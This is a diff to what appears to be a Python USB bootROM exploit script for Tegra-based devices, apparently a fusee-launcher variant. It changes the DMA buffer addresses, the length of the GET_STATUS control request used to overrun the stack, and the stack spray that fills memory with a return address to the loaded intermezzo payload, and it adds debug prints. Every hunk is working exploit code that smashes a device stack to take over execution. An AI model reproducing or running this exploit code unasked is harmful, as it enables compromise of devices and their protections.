@@ -164,7 +164,10 @@ class MacOSBackend(HaxBackend):
     def trigger_vulnerability(self, length):
 
         # Triggering the vulnerability is simplest on macOS; we simply issue the control request as-is.
-        return self.dev.ctrl_transfer(self.STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT, self.GET_STATUS, 0, 0, length)
+        r = self.dev.ctrl_transfer(self.STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT, self.GET_STATUS, 0, 0, length)
+        print("ctrl res:")
+        print(r)
+        return r
 
 
 
@@ -457,7 +460,7 @@ class RCMHax:
     DEFAULT_PID = 0x7330
 
     # Exploit specifics
-    COPY_BUFFER_ADDRESSES   = [0x40003000, 0x40005000]   # The addresses of the DMA buffers we can trigger a copy _from_.
+    COPY_BUFFER_ADDRESSES   = [0x40003000, 0x40003000]   # The addresses of the DMA buffers we can trigger a copy _from_.
     STACK_END               = 0x4000a000                 # The address just after the end of the device's stack.
 
     def __init__(self, wait_for_device=False, os_override=None, vid=None, pid=None, override_checks=False):
@@ -580,7 +583,7 @@ class RCMHax:
 
         # Determine how much we'd need to transmit to smash the full stack.
         if length is None:
-            length = self.STACK_END - self.get_current_buffer_address()
+            length = self.STACK_END - self.get_current_buffer_address() - 0x20
 
         print("sending status request with length {}".format(length))
 
@@ -663,43 +666,25 @@ with open(intermezzo_path, "rb") as f:
     intermezzo_size = len(intermezzo)
     payload        += intermezzo
 
-print("Payload offset of padding before user payload: 0x{:08x}".format(len(payload)))
+print("intermezzo size: 0x{:08x}".format(intermezzo_size))
 
-# Pad the payload till the start of the user payload.
-padding_size   = PAYLOAD_START_ADDR - (RCM_PAYLOAD_ADDR + intermezzo_size)
-payload += (b'\0' * padding_size)
-
-target_payload = b''
-
-# Read the user payload into memory.
-with open(payload_path, "rb") as f:
-    target_payload = f.read()
-
-print("Payload offset of user payload first part: 0x{:08x}".format(len(payload)))
-
-# Fit a collection of the payload before the stack spray...
-padding_size   = STACK_SPRAY_START - PAYLOAD_START_ADDR
-print("Padding size: 0x{:08x}".format(padding_size))
-payload += target_payload[:padding_size]
+assert(intermezzo_size % 4 == 0)
 
 print("Payload offset of stack spray: 0x{:08x}".format(len(payload)))
 
 # ... insert the stack spray...
-repeat_count = int((STACK_SPRAY_END - STACK_SPRAY_START) / 4)
+repeat_count = int((length - USB_XFER_MAX - len(payload)) / 4)
 print("injecting {} copies of payload address".format(repeat_count))
 payload += (RCM_PAYLOAD_ADDR.to_bytes(4, byteorder='little') * repeat_count)
 
-print("Payload offset user payload second part 0x{:08x}".format(len(payload)))
-
-# ... and follow the stack spray with the remainder of the payload.
-payload += target_payload[padding_size:]
-
-print("Payload offset of remaining RCM padding 0x{:08x}".format(len(payload)))
+print("Payload offset after stack spray 0x{:08x}".format(len(payload)))
 
 # Pad the payload to fill a USB request exactly, so we don't send a short
 # packet and break out of the RCM loop.
 payload_length = len(payload)
 padding_size   = USB_XFER_MAX - (payload_length % USB_XFER_MAX)
+print("End padding size 0x{:08x}".format(padding_size))
+
 payload += (b'\0' * padding_size)
 
 print("Payload offset of end of payload 0x{:08x}".format(len(payload)))
